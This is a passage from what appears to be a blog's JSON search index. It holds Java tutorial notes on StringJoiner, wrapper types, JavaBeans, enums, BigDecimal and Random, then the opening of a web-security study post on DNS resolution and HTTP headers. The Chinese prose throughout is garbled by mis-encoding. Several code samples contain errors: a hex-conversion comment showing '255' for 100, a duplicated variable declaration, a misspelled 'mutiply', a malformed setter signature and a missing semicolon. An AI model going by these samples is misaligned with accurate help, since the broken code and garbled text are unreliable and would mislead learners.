buildInsertSql(String table, String[] fields) &#123; // TODO: StringBuilder sb = new StringBuilder(&quot;INSERT INTO &quot;).append(table).append(&quot; (&quot;); for (String st: fields) &#123; sb.append(st).append(&quot;, &quot;); &#125; // æ³¨æ„å»æ‰æœ€åçš„&quot;, &quot;: sb.delete(sb.length()-2, sb.length()).append(&quot;) VALUES (&quot;); for (String st : fields) &#123; sb.append(&quot;?, &quot;); &#125; sb.delete(sb.length()-2, sb.length()).append(&quot;)&quot;); return sb.toString(); &#125;&#125; StringJoiner åœ¨ä¸Šé¢çš„é‚£ä¸ªç»ƒä¹ å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦, æ¥åˆ†å‰²æ¯ä¸ªå­—æ®µï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨StringJoinerå¯¹è±¡æ¥å¹²è¿™äº‹ã€‚ 12345678910111213141516import java.util.StringJoiner;public class Main &#123; public static void main(String[] args) &#123; String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;; var sj = new StringJoiner(&quot;, &quot;); for (String name: names) &#123; sj.add(name); &#125; System.out.println(sj.toString()) &#125;&#125;// è¾“å‡º// Bob, Alice, Grace è¿˜å¯ä»¥æŒ‡å®šâ€œå¼€å¤´â€å’Œâ€œç»“å°¾â€ï¼š 12345678910111213141516import java.util.StringJoiner;public class Main &#123; public static void main(String[] args) &#123; String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;; var sj = new StringJoiner(&quot;, &quot;, &quot;Hello&quot;, &quot;!&quot;); for (String name: names) &#123; sj.add(name); &#125; System.out.println(sj.toString()) &#125;&#125;// è¾“å‡º// Hello Bob, Alice, Grace! å…¶å®ï¼ŒStringè¿˜æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•join()ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨å†…éƒ¨ä½¿ç”¨äº†StringJoineræ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œåœ¨ä¸éœ€è¦æŒ‡å®šâ€œå¼€å¤´â€å’Œâ€œç»“å°¾â€çš„æ—¶å€™ï¼Œç”¨String.join()æ›´æ–¹ä¾¿ï¼š 123String[] names = &#123;&quot;Bob&quot;, &quot;Alice&quot;, &quot;Grace&quot;&#125;;var s = String.join(&quot;,&quot;, names); ç»ƒä¹  è¯·ä½¿ç”¨StringJoineræ„é€ ä¸€ä¸ªSELECTè¯­å¥ï¼š 12345678910111213141516171819202122232425262728package com.itranswarp.learnjava;import java.util.StringJoiner;/** * Learn Java from https://www.liaoxuefeng.com/ * * @author liaoxuefeng */public class Main &#123; public static void main(String[] args) &#123; String[] fields = &#123; &quot;name&quot;, &quot;position&quot;, &quot;salary&quot; &#125;; String table = &quot;employee&quot;; String select = buildSelectSql(table, fields); System.out.println(select); System.out.println(&quot;SELECT name, position, salary FROM employee&quot;.equals(select) ? &quot;æµ‹è¯•æˆåŠŸ&quot; : &quot;æµ‹è¯•å¤±è´¥&quot;); &#125; static String buildSelectSql(String table, String[] fields) &#123; // TODO: var sj = new StringJoiner(&quot;, &quot;, &quot;SELECT &quot;, &quot; FROM &quot;+table); for (String field: fields) &#123; sj.add(field); &#125; return sj.toString(); &#125;&#125; åŒ…è£…ç±»å‹ Javaä¸ºæ¯ç§åŸºæœ¬ç±»å‹éƒ½æä¾›äº†å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼š åŸºæœ¬ç±»å‹ å¯¹åº”çš„å¼•ç”¨ç±»å‹ boolean java.lang.Boolean byte java.lang.Byte short java.lang.Short int java.lang.Integer long java.lang.Long float java.lang.Float double java.lang.Double char java.lang.Character ä½¿ç”¨é™æ€æ–¹æ³•valueOf()åˆ›å»ºIntegerå®ä¾‹ï¼š 12345678public class Main &#123; public static void main(String[] args) &#123; int i = 100; Integer n1 = Integer.valueOf(i); Integer n2 = Integer.valueOf(&quot;100&quot;); &#125;&#125; è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®± Intå’ŒIntegerå¯ä»¥ç›¸äº’è½¬æ¢ï¼š 1234int i = 100;Integer n = Integer.valueOf(i);int x = n.intValue(); è€ŒJavaç¼–è¯‘å™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨åœ¨intå’ŒIntegerç›´é™ç›¸äº’è½¬æ¢ï¼š 123Integer n = 100;int x = n; ä½†æ˜¯è¿™æ ·åšå¯èƒ½ä¼šé€ æˆç©ºæŒ‡é’ˆå¼‚å¸¸çš„é”™è¯¯ï¼š 1234567public class Main &#123; public static void main(String[] args) &#123; Integer n = null; int i = n; &#125;&#125; ä¸å˜æ€§ ç”±äºåŒ…è£…ç±»å‹éƒ½å±äºå¼•ç”¨ç±»å‹ï¼Œæ‰€ä»¥ä¸€æ—¦åˆ›å»ºäº†åŒ…è£…ç±»å‹çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°±æ˜¯ä¸å¯å˜çš„ã€‚ å’ŒStringç±»ä¼¼ï¼Œå¯¹äºä¸¤ä¸ªIntegerå®ä¾‹è¿›è¡Œæ¯”è¾ƒå¿…é¡»ä½¿ç”¨equals()ï¼Œè€Œä¸èƒ½ä½¿ç”¨==ã€‚ è¿›åˆ¶è½¬æ¢ æœ€å¸¸ç”¨çš„é™æ€æ–¹æ³•parseInt()å¯ä»¥æŠŠå­—ç¬¦ä¸²è§£ææˆä¸€ä¸ªæ•´æ•°ï¼š 123int x1 = Integer.parseInt(&quot;100&quot;); // 100int x2 = Integer.parseInt(&quot;100&quot;, 16); // 255 Integerè¿˜å¯ä»¥æŠŠæ•´æ•°æ ¼å¼åŒ–ä¸ºæŒ‡å®šè¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼š 12345678910public class Main &#123; public static void main(String[] args) &#123; System.out.println(Integer.toString(100)); // &quot;100&quot; System.out.println(Integer.toString(100, 36)); // &quot;2s&quot; System.out.println(Integer.toHexString(100)); // &quot;255&quot; System.out.println(Integer.toOctalString(100)); // &quot;144&quot; System.out.println(Integer.toBinaryString(100)); // &quot;1100100&quot; &#125;&#125; æ‰€æœ‰çš„æ•´æ•°å’Œæµ®ç‚¹æ•°çš„åŒ…è£…ç±»å‹éƒ½ç»§æ‰¿è‡ªNumberï¼Œå› æ­¤ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°ç›´æ¥é€šè¿‡åŒ…è£…ç±»å‹è·å–å„ç§åŸºæœ¬ç±»å‹ï¼š 123456789//å‘ä¸Šè½¬å‹ä¸ºNumberNumber num = new Integer(100);// è·å–byte, int, long, float, double;byte b = num.byteValue();int i = num.intValue();long l = num.longValue();float f = num.floatValue();double d = num.doubleValue(); æ— ç¬¦å·æ•´å‹ 123456789public class Main &#123; public static void main() &#123; byte x = -1; byte x = 127; System.out.println(Byte.toUnsignedInt(x)); // 255 System.out.println(Byte.toUnsignedInt(x)); // 127 &#125;&#125; JavaBean å®šä¹‰ JavaBeanæ˜¯ä¸€ç§ç‰¹æ®Šä½†è¾ƒä¸ºå¸¸è§çš„classï¼Œå®ƒç¬¦åˆä¸‹åˆ—è¦æ±‚ï¼š æœ‰è‹¥å¹²ä¸ªprivateå®ä¾‹å­—æ®µï¼› é€šè¿‡publicæ–¹æ³•æ¥è¯»å†™å®ä¾‹å­—æ®µï¼› ä¸”è¯»å†™æ–¹æ³•ç¬¦åˆå¦‚ä¸‹å‘½åè§„èŒƒï¼š 12345//è¯»æ–¹æ³•public Type getXyz()//å†™æ–¹æ³•public void Type setXyz() ä½œç”¨ JavaBeanä¸»è¦ç”¨æ¥ä¼ é€’æ•°æ®ï¼Œå³æŠŠä¸€ç»„æ•°æ®ç»„åˆæˆä¸€ä¸ªJavaBeanä¾¿äºä¼ è¾“ æšä¸¾JavaBeanå±æ€§ è¦æšä¸¾ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Javaæ ¸å¿ƒåº“æä¾›çš„Introspectorï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Main &#123; public static void main(String[] args) throws Exception &#123; BeanInfo info = Introspector.getBeanInfo(Person.class); for (PropertyDescriptor pd : info.getPropertyDescriptors()) &#123; System.out.println(pd.getName()); System.out.println(&quot; &quot; + pd.getReadMethod()); System.out.println(&quot; &quot; + pd.getWriteMethod()); &#125; &#125;&#125;class Person &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;// è¾“å‡º/**age public int Person.getAge() public void Person.setAge(int)class public final native java.lang.Class java.lang.Object.getClass() nullname public java.lang.String Person.getName() public void Person.setName(java.lang.String)**/ æšä¸¾ç±» ç›´æ¥ä¸ŠğŸŒ°ï¼š 123456789101112131415public class Main &#123; public static void main() &#123; Weekday day = Weekday.SUN; if (day == Weekday.SUN || day == Weekday.SAT) &#123; System.out.println(&quot;Work at home&quot;); &#125; else &#123; System.out.println(&quot;Work an office!&quot;); &#125; &#125;&#125;enum Weekday &#123; SUN, MON, TUE, WED, THU, FRI, SAT;&#125; ä¸intç±»å‹çš„å¸¸é‡ç›¸æ¯”ï¼Œä½¿ç”¨enumå®šä¹‰æšä¸¾çš„ä¼˜åŠ¿æœ‰ï¼š enumå¸¸é‡æœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼Œå³Weekday.SUNçš„ç±»å‹æ˜¯Weekdayï¼› ä¸å¯èƒ½å¼•ç”¨åˆ°éæšä¸¾çš„å€¼ï¼› ä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½ç›¸äº’æ¯”è¾ƒæˆ–èµ‹å€¼ã€‚ enumçš„æ¯”è¾ƒ enumæ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œå‰é¢æåˆ°å¼•ç”¨ç±»å‹è¿›è¡Œæ¯”è¾ƒå¿…é¡»ä½¿ç”¨equal()ï¼Œå› ä¸º==æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªå¼•ç”¨ç±»å‹çš„å˜é‡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚ä½†enumç±»å‹å¯ä»¥ä¾‹å¤–ï¼Œå› ä¸ºenumç±»å‹çš„æ¯ä¸ªå¸¸é‡åœ¨JVMä¸­åªæœ‰ä¸€ä¸ªå”¯ä¸€å®ä¾‹ã€‚æ‰€ä»¥ï¼š 123day == Weekday.FRI //trueday.equals(Weekday.FRI) //true enumçš„æ–¹æ³• name() è¿”å›å¸¸é‡åï¼Œä¾‹å¦‚ï¼š 12String s = Weekday.SUN.name() // &quot;SUN&quot; ordinal() è¿”å›å®šä¹‰å¸¸é‡çš„é¡ºåºï¼Œä¾‹å¦‚ 12int n = Weekday.SUN.ordinal() // 0 ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ”¹å˜æšä¸¾å¸¸é‡å®šä¹‰çš„é¡ºåºå°±ä¼šå¯¼è‡´ordinal()è¿”å›å€¼å‘ç”Ÿå˜åŒ–ã€‚ å¦‚æœæšä¸¾ç±»å‹è¦å’Œintè½¬æ¢ï¼Œå¤„äºç¨‹åºçš„å¥å£®æ€§è€ƒè™‘ï¼Œå°±ä¸èƒ½ä¾é ordinal()çš„è¿”å›å€¼ã€‚å› ä¸ºenumæœ¬èº«å°±æ˜¯ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¯ä¸ªæšä¸¾å¸¸é‡å¢åŠ ä¸€ä¸ªå­—æ®µï¼Œå¹¶å®šä¹‰privateçš„æ„é€ æ–¹æ³•ã€‚ 123456789101112131415161718192021public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; if (day.dayValue == 6 || day.dayValue == 7)&#123; System.out.println(&quot;Work at home!&quot;); &#125; else &#123; System.out.println(&quot;Work at office!&quot;); &#125; &#125;&#125;enum Weekday &#123; MON(1), TUE(2), WED(3), THU(4), FRI(5), SAT(6), SUN(0); public final int dayValue; private Weekday(int dayValue)&#123; this.dayValue = dayValue; &#125;&#125; toString() é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹æšä¸¾å¸¸é‡è°ƒç”¨toString()ä¼šè¿”å›å’Œname()ä¸€æ ·çš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯ï¼ŒtoString()å¯ä»¥è¢«è¦†å†™ï¼Œè€Œname()åˆ™ä¸è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç»™Weekdayæ·»åŠ toString()æ–¹æ³•ï¼š 12345678910111213141516171819202122232425262728public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; if (day.dayValue == 6 || day.dayValue == 7)&#123; System.out.println(&quot;Today is &quot; + day + &quot;. Work at home!&quot;); &#125; else &#123; System.out.println(&quot;Today is &quot; + day + &quot;. Work at office!&quot;); &#125; &#125;&#125;enum Weekday &#123; MON(1, &quot;æ˜ŸæœŸä¸€&quot;), TUE(2, &quot;æ˜ŸæœŸäºŒ&quot;), WED(3, &quot;æ˜ŸæœŸä¸‰&quot;), THU(4, &quot;æ˜ŸæœŸå››&quot;), FRI(5, &quot;æ˜ŸæœŸäº”&quot;), SAT(6, &quot;æ˜ŸæœŸå…­&quot;), SUN(0, &quot;æ˜ŸæœŸæ—¥&quot;); public final int dayValue; public final String chinese; private Weekday(int dayValue, String chinese)&#123; this.dayValue = dayValue; this.chinese = chinese; &#125; @Override public String toString() &#123; return this.chinese; &#125;&#125; Switch 12345678910111213141516171819202122232425public class Main &#123; public static void main(String[] args) &#123; Weekday day = Weekday.SUN; switch(day) &#123; case MON: case TUE: case WED: case THU: case FRI: System.out.println(&quot;Today is &quot; + day + &quot;. Work at office!&quot;); break; case SAT: case SUN: System.out.println(&quot;Today is &quot; + day + &quot;. Work at home!&quot;); break; default: throw new RuntimeException(&quot;cannot process &quot; + day); &#125; &#125;&#125;enum Weekday &#123; MON, TUE, WED, THU, FRI, SAT, SUN;&#125; BigInteger BigDecimal å®šä¹‰ 123BigDecimal bd = new BigDecimal(&quot;123.4567&quot;);System.out.println(bd.mutiply(bd)); // 15241.55677489 è·å–å°æ•°ä½æ•° 1234567BigDecimal d1 = new BigDecimal(&quot;123.45&quot;);BigDecimal d2 = new BigDecimal(&quot;123.4500&quot;);BigDecimal d3 = new BigDecimal(&quot;1234500&quot;);System.out.println(d1.scale()); // 2,ä¸¤ä½å°æ•°System.out.println(d2.scale()); // 4System.out.println(d3.scale()); // 0 å‰”é™¤å°æ•°æœ«å°¾0 12345678910BigDecimal d1 = new BigDecimal(&quot;123.4500&quot;);BigDecimal d2 = d1.stripTrailingZeros();System.out.println(d1.scale()); // 4System.out.println(d2.scale()); // 2,å› ä¸ºå»æ‰äº†00BigDecimal d3 = new BigDecimal(&quot;1234500&quot;);BigDecimal d4 = d3.stripTrailingZeros();System.out.println(d3.scale()); // 0System.out.println(d4.scale()); // -2,è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå¹¶ä¸”æœ«å°¾æœ‰ä¸¤ä¸ª0 è®¾ç½®ç²¾åº¦ 1234567891011import java.math.BigDecimal;import java.math.RoundingMode;public class Main &#123; public static void main(String[] args) &#123; BigDecimal d1 = new BigDecimal(&quot;123.456789&quot;); BigDecimal d2 = d1.setScale(4, RoundingMode.HALF_UP); // 123.4568 å››èˆäº”å…¥ä¿ç•™4ä½å°æ•° BigDecimal d3 = d1.setScale(4, RoundingMode.DOWN); //123.4567 ç›´æ¥æˆªæ–­ &#125;&#125; é™¤æ³•è¿ç®— å¯¹BigDecimalåšåŠ ã€å‡ã€ä¹˜æ—¶ï¼Œç²¾åº¦ä¸ä¼šä¸¢å¤±ï¼Œä½†æ˜¯åšé™¤æ³•æ—¶ï¼Œå­˜åœ¨æ— æ³•é™¤å°½çš„æƒ…å†µï¼Œè¿™æ—¶ï¼Œå°±å¿…é¡»æŒ‡å®šç²¾åº¦ä»¥åŠå¦‚ä½•è¿›è¡Œæˆªæ–­ï¼š 1234BigDecimal d1 = new BigDecimal(&quot;123.456&quot;);BigDecimal d2 = new BigDecimal(&quot;23.456789&quot;);BigDecimal d3 = d1.divide(d2, 10, RoundingMode.HALF_UP); //ä¿ç•™10ä½å°æ•°å¹¶å››èˆäº”å…¥ æ¯”è¾ƒ åœ¨æ¯”è¾ƒä¸¤ä¸ªBigDecimalçš„å€¼æ˜¯å¦ç›¸ç­‰æ—¶ï¼Œè¦ç‰¹åˆ«æ³¨æ„ï¼Œä½¿ç”¨equals()æ–¹æ³•ä¸ä½†è¦æ±‚ä¸¤ä¸ªBigDecimalçš„å€¼ç›¸ç­‰ï¼Œè¿˜è¦æ±‚å®ƒä»¬çš„scale()ç›¸ç­‰ï¼š 123456BigDecimal d1 = new BigDecimal(&quot;123.456&quot;);BigDecimal d2 = new BigDecimal(&quot;123.45600&quot;);d1.equals(d2); // Falsed1.equals(d2.stripTrailingZeros()); // Trued1.compareTo(d2); //0 æ ¹æ®ä¸¤ä¸ªå€¼çš„å¤§å°åˆ†åˆ«è¿”å›è´Ÿæ•°ã€æ­£æ•°å’Œ0ï¼Œåˆ†åˆ«è¡¨ç¤ºå°äºã€å¤§äºå’Œç­‰äºã€‚ æ€»æ˜¯ä½¿ç”¨compareTo()æ¯”è¾ƒä¸¤ä¸ªBigDecimalçš„å€¼ï¼Œä¸è¦ä½¿ç”¨equals()ï¼ å¸¸ç”¨å·¥å…·ç±» Mathï¼šæ•°å­¦è®¡ç®— Randomï¼šç”Ÿæˆä¼ªéšæœºæ•° è¦ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œå¯ä»¥ä½¿ç”¨nextInt()ã€nextLong()ã€nextFloat()ã€nextDouble()ï¼š 1234567Random r = new Random();r.nextInt(); // 2071575453,æ¯æ¬¡éƒ½ä¸ä¸€æ ·r.nextInt(10); // 5,ç”Ÿæˆä¸€ä¸ª[0,10)ä¹‹é—´çš„intr.nextLong(); // 8811649292570369305,æ¯æ¬¡éƒ½ä¸ä¸€æ ·r.nextFloat(); // 0.54335...ç”Ÿæˆä¸€ä¸ª[0,1)ä¹‹é—´çš„floatr.nextDouble(); // 0.3716...ç”Ÿæˆä¸€ä¸ª[0,1)ä¹‹é—´çš„double å¦‚æœæˆ‘ä»¬åœ¨åˆ›å»ºRandomå®ä¾‹æ—¶æŒ‡å®šä¸€ä¸ªç§å­ï¼Œå°±ä¼šå¾—åˆ°å®Œå…¨ç¡®å®šçš„éšæœºæ•°åºåˆ—ï¼š 12345678910import java.util.Random;public class Main &#123; public static void main(String[] args) &#123; Random r = new Random(12345); for (int i = 0; i &lt; 10; i++) &#123; System.out.println(r.nextInt(100)); &#125; &#125;&#125; SecureRandomï¼šç”Ÿæˆå®‰å…¨çš„éšæœºæ•°","tags":[{"name":"java","slug":"java","permalink":"http://ca0y1h.top/tags/java/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"java","slug":"ç¼–ç¨‹/java","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ ","date":"2019-10-04T09:17:20.000Z","path":"Web_security/basic_learning/6.Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹ /","text":"Webå®‰å…¨å­¦ä¹ ä¹‹Webé¡µé¢è§£æçš„æµç¨‹å­¦ä¹  ä»»åŠ¡ç›®æ ‡ ç†è§£åŸŸåè§£æçš„æ•´ä¸ªæµç¨‹ï¼› ç†è§£Webé¡µé¢è¯·æ±‚çš„æ•´ä¸ªæµç¨‹ï¼Œç»˜åˆ¶æµç¨‹å›¾ï¼ˆngnixå¤„ç†çš„11ä¸ªè¿‡ç¨‹ï¼‰ï¼› å­¦ä¹ HTTPåè®®ä¸­çš„å­—æ®µåŠå«ä¹‰ï¼› å­¦ä¹ HTTPè¯·æ±‚æ–¹æ³•ä»¥åŠè¿”å›çŠ¶æ€ç çš„ç±»å‹å’Œå«ä¹‰ã€‚ 0x01 åŸŸåè§£ææµç¨‹ è¿™ç¯‡æ–‡ç« å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚ åŸŸåå±‚æ¬¡ç»“æ„ ) åŸŸåæœåŠ¡å™¨ ) å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚ åŸŸåè§£æè®°å½• A (Address) è®°å½•ï¼šåˆç§°IPæŒ‡å‘ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ­¤è®¾ç½®â¼¦åŸŸåå¹¶æŒ‡å‘åˆ°â¾ƒâ¼°çš„â½¬æ ‡ä¸»æœºåœ°å€ä¸Šï¼Œä» è€Œå®ç°é€šè¿‡åŸŸåæ‰¾åˆ°æœåŠ¡å™¨ã€‚ CNAMEè®°å½•ï¼šä¹Ÿè¢«ç§°ä¸ºè§„èŒƒåå­—ã€‚è¿™ç§è®°å½•å…è®¸æ‚¨å°†å¤šä¸ªåå­—æ˜ å°„åˆ°åŒâ¼€å°è®¡ç®—æœºã€‚ MXï¼ˆMail Exchangerï¼‰è®°å½•ï¼šé‚®ä»¶äº¤æ¢è®°å½•ï¼Œå®ƒæŒ‡å‘â¼€ä¸ªé‚®ä»¶æœåŠ¡å™¨ï¼Œâ½¤äºç”µâ¼¦é‚®ä»¶ç³»ç»Ÿå‘é‚® ä»¶æ—¶æ ¹æ® æ”¶ä¿¡â¼ˆçš„åœ°å€åç¼€æ¥å®šä½é‚®ä»¶æœåŠ¡å™¨ã€‚ NS(Name Server)è®°å½•ï¼šè§£ææœåŠ¡å™¨è®°å½•ã€‚â½¤æ¥è¡¨æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›â¾è§£æã€‚è¿™â¾¥çš„NS è®°å½•åªå¯¹â¼¦åŸŸåâ½£æ•ˆã€‚ TXTè®°å½•ï¼šâ¼€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜ã€‚ åŸŸåè§£æè¿‡ç¨‹ ä»¥æŸ¥è¯¢jocent.meä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢ â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meçš„IPåœ°å€ â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨dns.meè¿›è¡ŒæŸ¥è¯¢ â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨dns.jocent.meçš„IPåœ°å€ â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨dns.jocent.meè¿›è¡ŒæŸ¥è¯¢ â‘¦æƒé™æœåŠ¡å™¨dns.jocent.meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€ â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90 æ€»çš„æ¥è¯´DNSè§£æè¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢: é€’å½’æŸ¥è¯¢ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚ è¿­ä»£æŸ¥è¯¢ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚ 0x02 Webé¡µé¢è¯·æ±‚æµç¨‹ å¯¹NginxçŸ¥ä¹‹ç”šå°‘ï¼Œå…³äºNginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µå…ˆå ä¸ªå‘ï¼Œç•™ä¸ªæ¯”è¾ƒå…¨é¢çš„å­¦ä¹ æ–‡æ¡£å ä¸ªå‘ã€‚ 0x03 HTTPåè®®çš„å­—æ®µåŠå«ä¹‰ HTTPè¯·æ±‚æŠ¥æ–‡ è¯·æ±‚æŠ¥æ–‡ç»“æ„ï¼š å…¶ä¸­ï¼Œå€¼å¾—å…³æ³¨çš„æ˜¯HTTPæŠ¥æ–‡å¤´ç”±æ–¹æ³•ã€URI ã€HTTPç‰ˆæœ¬ã€HTTPé¦–éƒ¨å­—æ®µç­‰éƒ¨åˆ†æ„æˆã€‚ ä¾‹å¦‚ï¼Œè¯·æ±‚hackr.jpç½‘ç«™çš„è¯·æ±‚æŠ¥æ–‡å¤´å¦‚ä¸‹æ‰€ç¤ºï¼š HTTPå“åº”æŠ¥æ–‡ å“åº”æŠ¥æ–‡ç»“æ„ï¼š ä¾‹å¦‚ï¼Œåˆšåˆšè¯·æ±‚çš„hackr.jpçš„å“åº”æŠ¥æ–‡å¤´å¦‚ä¸‹æ‰€ç¤ºï¼š HTTPé¦–éƒ¨å­—æ®µç±»å‹ é€šç”¨é¦–éƒ¨å­—æ®µï¼ˆGeneral Header Fieldsï¼‰ è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡ä¸¤æ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ã€‚ Cache-Controlå­—æ®µ é€šè¿‡æŒ‡å®šé¦–éƒ¨å­—æ®µ Cache-Control çš„æŒ‡ä»¤ï¼Œå°±èƒ½æ“ä½œç¼“å­˜çš„å·¥ä½œæœºåˆ¶ã€‚ ç¼“å­˜è¯·æ±‚æŒ‡ä»¤ä¸€è§ˆï¼š æŒ‡ä»¤ Client Server no-cache ä¸æ¥æ”¶ç¼“å­˜è¿‡çš„å“åº” ä¸èƒ½å¯¹èµ„æºè¿›è¡Œç¼“å­˜ no-store ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹ ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹ max-age = [ç§’] æ¥æ”¶ç¼“å­˜æ—¶é—´æ¯”max-ageæ•°å€¼æ›´å°çš„èµ„æº ä»£è¡¨èµ„æºä¿å­˜ä¸ºç¼“å­˜çš„æœ€é•¿æ—¶é—´ max-stale = [ç§’] æ¥æ”¶å·²è¿‡æœŸçš„å“åº” min-fresh = [ç§’] æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ no-transform ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»å‹ only-if-cached ä»ç¼“å­˜è·å–èµ„æº cache-extension æ–°æŒ‡ä»¤æ ‡è®° **æ³¨æ„ï¼š**ä»å­—é¢æ„æ€ä¸Šå¾ˆå®¹æ˜“æŠŠ no-cache è¯¯è§£æˆä¸ºä¸ç¼“å­˜ï¼Œä½†äº‹å®ä¸Š no-cache 